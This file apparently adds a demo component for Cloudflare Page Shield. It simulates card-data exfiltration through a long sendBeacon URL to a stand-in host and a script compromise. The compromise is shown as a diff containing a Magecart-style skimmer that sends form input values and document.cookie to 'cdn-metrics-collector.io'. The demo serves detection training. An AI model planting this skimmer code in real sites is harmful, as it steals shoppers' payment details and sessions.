@@ -1,0 +1,485 @@
+---
+// Page Shield demo.
+// Two repeatable attack scenarios:
+//
+//   1. "Simulate: Data Exfiltration" — fires navigator.sendBeacon() to a
+//      very long URL containing fake card data. This trips Page Shield's
+//      Max URL Length alert (configured on this zone). The URL itself is
+//      the visual evidence.
+//
+//   2. "Simulate: Script Compromise" — flips /api/page-shield/analytics.js
+//      between a clean v1 and a v2 with a Magecart-style skimmer injected.
+//      Page Shield has fingerprinted v1, so the version flip trips the
+//      Code Change Detection alert.
+//
+// The analytics script is loaded by this component (not site-wide) so that
+// Page Shield sees and fingerprints it as part of the demo zone's inventory.
+---
+
+<!-- Load the "analytics" script so Page Shield can monitor and fingerprint it. -->
+<script src="/api/page-shield/analytics.js" is:inline async></script>
+
+<div x-data="pageShieldDemo()" x-init="loadStatus()" class="space-y-5">
+  <!-- ───── Alert banner (appears after a successful trigger) ───── -->
+  <div
+    x-show="alert.visible"
+    x-transition
+    class="demo-panel danger"
+    style="display: none;"
+  >
+    <div class="flex items-start gap-3">
+      <div class="text-2xl leading-none">⚠️</div>
+      <div class="flex-1">
+        <h3 class="!mb-1" x-text="alert.title"></h3>
+        <p class="text-sm text-gray-700" x-text="alert.detail"></p>
+        <p class="text-xs text-gray-500 mt-2">
+          Resource: <code class="bg-silver-50 px-1.5 py-0.5 rounded" x-text="alert.resource"></code>
+        </p>
+        <p class="text-xs text-gray-500 mt-1">
+          A Page Shield alert email matching this signature will arrive within a few minutes.
+        </p>
+      </div>
+      <button
+        type="button"
+        @click="alert.visible = false"
+        class="text-gray-400 hover:text-gray-600 text-xl leading-none"
+      >×</button>
+    </div>
+  </div>
+
+  <!-- ───── Two-column main panel ───── -->
+  <div class="demo-columns">
+    <!-- Left: Mock checkout form -->
+    <div class="demo-panel" :class="formCompromised ? 'danger' : 'safe'">
+      <h3 x-text="formCompromised ? 'Checkout Form (COMPROMISED)' : 'Checkout Form'"></h3>
+      <p class="text-xs text-gray-500 mb-3">
+        Pre-filled with test data. The skimmer reads from these fields when triggered.
+      </p>
+      <div class="space-y-2">
+        <div>
+          <label class="text-xs text-gray-600 block mb-1">Cardholder name</label>
+          <input
+            type="text"
+            x-model="card.name"
+            class="demo-input w-full"
+            :class="formCompromised ? 'ring-2 ring-red-400 animate-pulse' : ''"
+          />
+        </div>
+        <div>
+          <label class="text-xs text-gray-600 block mb-1">Card number</label>
+          <input
+            type="text"
+            x-model="card.number"
+            class="demo-input w-full font-mono"
+            :class="formCompromised ? 'ring-2 ring-red-400 animate-pulse' : ''"
+          />
+        </div>
+        <div class="grid grid-cols-2 gap-2">
+          <div>
+            <label class="text-xs text-gray-600 block mb-1">Expiry</label>
+            <input
+              type="text"
+              x-model="card.exp"
+              class="demo-input w-full font-mono"
+              :class="formCompromised ? 'ring-2 ring-red-400 animate-pulse' : ''"
+            />
+          </div>
+          <div>
+            <label class="text-xs text-gray-600 block mb-1">CVV</label>
+            <input
+              type="text"
+              x-model="card.cvv"
+              class="demo-input w-full font-mono"
+              :class="formCompromised ? 'ring-2 ring-red-400 animate-pulse' : ''"
+            />
+          </div>
+        </div>
+      </div>
+      <button type="button" disabled class="btn-primary mt-3 w-full opacity-60 cursor-not-allowed">
+        Pay $127.50
+      </button>
+    </div>
+
+    <!-- Right: Script inventory / Network monitor -->
+    <div class="demo-panel" :class="rightPanel.mode === 'network' ? 'danger' : 'safe'">
+      <div class="flex items-baseline justify-between mb-2">
+        <h3 class="!mb-0" x-text="rightPanel.mode === 'network' ? 'Network Activity' : 'Script Inventory'"></h3>
+        <span class="text-xs text-gray-500" x-text="rightPanel.mode === 'network' ? 'live' : 'monitored'"></span>
+      </div>
+
+      <!-- Inventory view -->
+      <div x-show="rightPanel.mode === 'inventory'" class="space-y-2 text-xs">
+        <template x-for="script in scripts" :key="script.url">
+          <div class="flex items-start gap-2 py-1.5 border-b border-silver-100 last:border-b-0">
+            <div class="mt-0.5 flex-shrink-0">
+              <span x-show="script.status === 'trusted'" class="text-green-600">✓</span>
+              <span x-show="script.status === 'changed'" class="text-red-600">⚠</span>
+              <span x-show="script.status === 'malicious'" class="text-red-700">✗</span>
+            </div>
+            <div class="flex-1 min-w-0">
+              <div class="font-mono truncate" x-text="script.url" :title="script.url"></div>
+              <div class="text-gray-500" x-text="script.label"></div>
+              <div x-show="script.hash" class="text-gray-400 font-mono mt-0.5" x-text="'sha256: ' + script.hash"></div>
+            </div>
+          </div>
+        </template>
+      </div>
+
+      <!-- Network monitor view -->
+      <div x-show="rightPanel.mode === 'network'" class="code-output text-xs" style="max-height: 280px; overflow-y: auto;">
+        <template x-for="(entry, i) in network" :key="i">
+          <div
+            class="py-1 border-b border-silver-100 last:border-b-0"
+            :class="entry.severity === 'critical' ? 'text-red-700' : entry.severity === 'warn' ? 'text-amber-700' : 'text-gray-600'"
+          >
+            <div>
+              <span class="text-gray-400" x-text="'[' + entry.t + ']'"></span>
+              <span class="font-semibold ml-1" x-text="entry.method"></span>
+              <span class="ml-1" x-text="entry.status"></span>
+            </div>
+            <div class="font-mono break-all mt-0.5 leading-tight" x-text="entry.url"></div>
+            <div x-show="entry.note" class="text-xs italic mt-0.5" x-text="entry.note"></div>
+          </div>
+        </template>
+        <div x-show="network.length === 0" class="text-gray-500 italic">No activity yet.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ───── Trigger buttons ───── -->
+  <div class="flex flex-wrap gap-3">
+    <button
+      type="button"
+      @click="triggerExfil"
+      :disabled="busy"
+      class="btn-danger"
+    >
+      Simulate: Data Exfiltration
+    </button>
+    <button
+      type="button"
+      @click="triggerCompromise"
+      :disabled="busy"
+      class="btn-danger"
+    >
+      Simulate: Script Compromise
+    </button>
+    <button
+      type="button"
+      @click="reset"
+      :disabled="busy"
+      class="btn-primary"
+    >
+      Reset
+    </button>
+    <span class="text-sm text-gray-500 self-center" x-show="busy" x-text="status"></span>
+  </div>
+
+  <!-- ───── Script-version diff (shown after compromise) ───── -->
+  <div x-show="diff.visible" x-transition class="demo-panel danger" style="display: none;">
+    <h3>Code Change Detected: /api/page-shield/analytics.js</h3>
+    <p class="text-xs text-gray-500 mb-3">
+      Page Shield compares the hash of every monitored script on each load.
+      A mismatch against the last known fingerprint generates a Code Change alert.
+    </p>
+    <div class="demo-columns text-xs">
+      <div>
+        <div class="font-semibold text-green-700 mb-1">Before (v1)</div>
+        <pre class="code-output" style="white-space: pre-wrap; word-break: break-word;" set:text={`// tracks pageviews + outbound clicks
+window.addEventListener("DOMContentLoaded", function () {
+  track("pageview", { path: location.pathname });
+});
+document.addEventListener("click", function (e) {
+  var a = e.target.closest("a[href]");
+  if (a) track("click", { href: a.href });
+});`} />
+      </div>
+      <div>
+        <div class="font-semibold text-red-700 mb-1">After (v2) — injected payload</div>
+        <pre class="code-output" style="white-space: pre-wrap; word-break: break-word; background: #2a0a0a;" set:text={`// ... same code as v1, then:
+document.addEventListener("blur", function (e) {
+  var t = e.target;
+  if (t.tagName !== "INPUT") return;
+  var c = window.__remydemo_collected || (window.__remydemo_collected = {});
+  c[t.name || t.id] = t.value;
+  navigator.sendBeacon(
+    "https://cdn-metrics-collector.io/px?sid="
+      + encodeURIComponent(document.cookie)
+      + "&d=" + encodeURIComponent(JSON.stringify(c))
+  );
+}, true);`} />
+      </div>
+    </div>
+  </div>
+
+  <!-- ───── Helper notes ───── -->
+  <div class="text-xs text-gray-500 space-y-1">
+    <p>
+      <strong>Live version:</strong>
+      <code class="bg-silver-50 px-1.5 py-0.5 rounded" x-text="'/api/page-shield/analytics.js → ' + (liveVersion || '…')"></code>
+    </p>
+    <p>
+      Beacon URL captured by Page Shield is also visible in your browser's
+      DevTools Network tab.
+    </p>
+  </div>
+</div>
+
+<script is:inline>
+  function pageShieldDemo() {
+    return {
+      card: {
+        name: "Jane Smith",
+        number: "4111 1111 1111 1111",
+        exp: "12/28",
+        cvv: "874",
+      },
+
+      busy: false,
+      status: "",
+      formCompromised: false,
+      liveVersion: null,
+
+      alert: {
+        visible: false,
+        title: "",
+        detail: "",
+        resource: "",
+      },
+
+      diff: { visible: false },
+
+      rightPanel: { mode: "inventory" },
+
+      scripts: [
+        {
+          url: "https://www.googletagmanager.com/gtm.js?id=GTM-5JTNQT5S",
+          label: "Google Tag Manager",
+          status: "trusted",
+          hash: "a3f2…91c4",
+        },
+        {
+          url: "https://cdn.tailwindcss.com",
+          label: "Tailwind CSS (CDN)",
+          status: "trusted",
+          hash: "7d11…b820",
+        },
+        {
+          url: "https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js",
+          label: "Alpine.js",
+          status: "trusted",
+          hash: "5e88…07a3",
+        },
+        {
+          url: "/api/page-shield/analytics.js",
+          label: "remydemo analytics (first-party)",
+          status: "trusted",
+          hash: "f04c…ad29",
+        },
+      ],
+
+      network: [],
+
+      async loadStatus() {
+        try {
+          const res = await fetch("/api/page-shield/status", { cache: "no-store" });
+          const data = await res.json();
+          this.liveVersion = data.version;
+          // Surface the actual hash for the analytics script if v2 is already live
+          if (data.version === "v2") {
+            const s = this.scripts.find((x) => x.url === "/api/page-shield/analytics.js");
+            if (s) {
+              s.status = "changed";
+              s.hash = "9b71…ee05";
+              s.label = "remydemo analytics (CODE CHANGED)";
+            }
+          }
+        } catch (e) {
+          this.liveVersion = "v1";
+        }
+      },
+
+      ts() {
+        return new Date().toISOString().slice(11, 19);
+      },
+
+      async triggerExfil() {
+        this.busy = true;
+        this.status = "Skimmer harvesting form fields…";
+        this.alert.visible = false;
+        this.rightPanel.mode = "network";
+        this.network = [];
+        this.formCompromised = true;
+
+        // Beat 1: a benign legitimate POST so the contrast is visible
+        this.network = [
+          {
+            t: this.ts(),
+            method: "POST",
+            status: "200",
+            url: "/api/checkout/submit",
+            severity: "ok",
+            note: "Legitimate first-party request",
+          },
+        ];
+
+        await new Promise((r) => setTimeout(r, 600));
+
+        // Beat 2: construct the oversized exfil URL containing card data
+        const session =
+          "sess_" +
+          Math.random().toString(36).slice(2) +
+          Math.random().toString(36).slice(2);
+        const ua = navigator.userAgent;
+        const ref = location.href;
+        const params = new URLSearchParams({
+          sid: session,
+          cc: this.card.number.replace(/\s+/g, ""),
+          exp: this.card.exp,
+          cvv: this.card.cvv,
+          name: this.card.name,
+          email: "jane.smith+demo@example.com",
+          billing_addr: "742 Evergreen Terrace, Springfield, OR 97477, US",
+          shipping_addr: "742 Evergreen Terrace, Springfield, OR 97477, US",
+          ip: "203.0.113.45",
+          ua: ua,
+          ref: ref,
+          ts: String(Date.now()),
+          // Pad with extra junk so the URL definitively crosses the
+          // Max URL Length threshold Page Shield is configured to alert on.
+          ctx:
+            "browser_fingerprint_v3:" +
+            btoa(ua + "|" + screen.width + "x" + screen.height + "|" + navigator.language).slice(0, 256),
+          tour: "checkout-funnel-v7-A",
+          dt: new Date().toISOString(),
+        });
+        const exfilUrl =
+          "https://cdn-metrics-collector.io/px?" + params.toString();
+
+        // Beat 3: fire the beacon. Will fail at the network layer (CORS / no
+        // such host) but Page Shield captures the attempt either way.
+        try {
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon(exfilUrl);
+          } else {
+            // Best-effort fallback
+            fetch(exfilUrl, { mode: "no-cors", keepalive: true }).catch(() => {});
+          }
+        } catch (e) {
+          /* expected */
+        }
+
+        this.network = [
+          {
+            t: this.ts(),
+            method: "POST",
+            status: "(blocked / network err)",
+            url: exfilUrl,
+            severity: "critical",
+            note:
+              "URL length: " +
+              exfilUrl.length +
+              " chars — exceeds Page Shield monitoring threshold",
+          },
+          ...this.network,
+        ];
+
+        await new Promise((r) => setTimeout(r, 400));
+
+        // Beat 4: alert lands
+        this.alert = {
+          visible: true,
+          title: "Page Shield Alert: Max URL Length Exceeded",
+          detail:
+            "An outbound connection from this page used a URL of " +
+            exfilUrl.length +
+            " characters, exceeding the configured monitoring threshold. URLs of this length are commonly used to exfiltrate harvested form data via query-string encoding.",
+          resource: "cdn-metrics-collector.io",
+        };
+
+        this.status = "Alert fired. Check your email shortly.";
+        this.busy = false;
+      },
+
+      async triggerCompromise() {
+        this.busy = true;
+        this.status = "Flipping the analytics script to v2 (compromised)…";
+        this.alert.visible = false;
+        this.diff.visible = false;
+
+        try {
+          const res = await fetch("/api/page-shield/toggle", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ version: "v2" }),
+          });
+          const data = await res.json();
+          this.liveVersion = data.version;
+        } catch (e) {
+          this.status = "Toggle failed: " + (e && e.message);
+          this.busy = false;
+          return;
+        }
+
+        // Update the inventory: the analytics script is now flagged
+        const s = this.scripts.find(
+          (x) => x.url === "/api/page-shield/analytics.js"
+        );
+        if (s) {
+          s.status = "changed";
+          s.label = "remydemo analytics (CODE CHANGED)";
+          s.hash = "9b71…ee05";
+        }
+        this.rightPanel.mode = "inventory";
+
+        await new Promise((r) => setTimeout(r, 500));
+
+        this.diff.visible = true;
+        this.alert = {
+          visible: true,
+          title: "Page Shield Alert: Code Change Detected",
+          detail:
+            "A monitored script's content hash has changed since the last fingerprint. The script remains hosted at the same URL but now contains code that was not present when Page Shield first inventoried it. This pattern matches Magecart-style CDN compromise.",
+          resource: location.origin + "/api/page-shield/analytics.js",
+        };
+        this.status = "Alert fired. Check your email shortly.";
+        this.busy = false;
+      },
+
+      async reset() {
+        this.busy = true;
+        this.status = "Resetting…";
+
+        // Flip the script back to v1
+        try {
+          const res = await fetch("/api/page-shield/toggle", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ version: "v1" }),
+          });
+          const data = await res.json();
+          this.liveVersion = data.version;
+        } catch (e) {
+          /* ignore */
+        }
+
+        const s = this.scripts.find(
+          (x) => x.url === "/api/page-shield/analytics.js"
+        );
+        if (s) {
+          s.status = "trusted";
+          s.label = "remydemo analytics (first-party)";
+          s.hash = "f04c…ad29";
+        }
+
+        this.formCompromised = false;
+        this.alert.visible = false;
+        this.diff.visible = false;
+        this.network = [];
+        this.rightPanel.mode = "inventory";
+        this.status = "";
+        this.busy = false;
+      },
+    };
+  }
+</script>
